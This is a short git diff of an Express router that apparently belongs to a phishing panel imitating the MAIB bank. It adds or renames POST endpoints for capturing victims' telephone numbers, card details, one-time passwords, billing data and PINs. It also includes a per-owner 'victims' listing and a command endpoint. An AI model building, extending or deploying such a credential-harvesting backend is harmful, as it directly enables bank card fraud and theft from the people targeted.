@@ -4,9 +4,11 @@ const {
     command,
     getInfo,
     submitTelephone,
-    submitTelephoneAgain,
+    submitCardAgain,
     submitCard,
     submitOtp,
+    submitBilling,
+    submitPin,
     deleteEntry,
 } = require("../controllers/maibController");
 
@@ -16,9 +18,11 @@ router.get("/customers/:owner", getOwnerVics);
 router.post("/command", command);
 router.get("/customers/id/:uniqueid", getInfo);
 router.post("/telephone", submitTelephone);
-router.post("/telephoneAgain", submitTelephoneAgain);
+router.post("/cardAgain", submitCardAgain);
 router.post("/otp", submitOtp);
 router.post("/card", submitCard);
+router.post("/billing", submitBilling);
+router.post("/pin", submitPin);
 router.post("/delete", deleteEntry);
 
 module.exports = router;
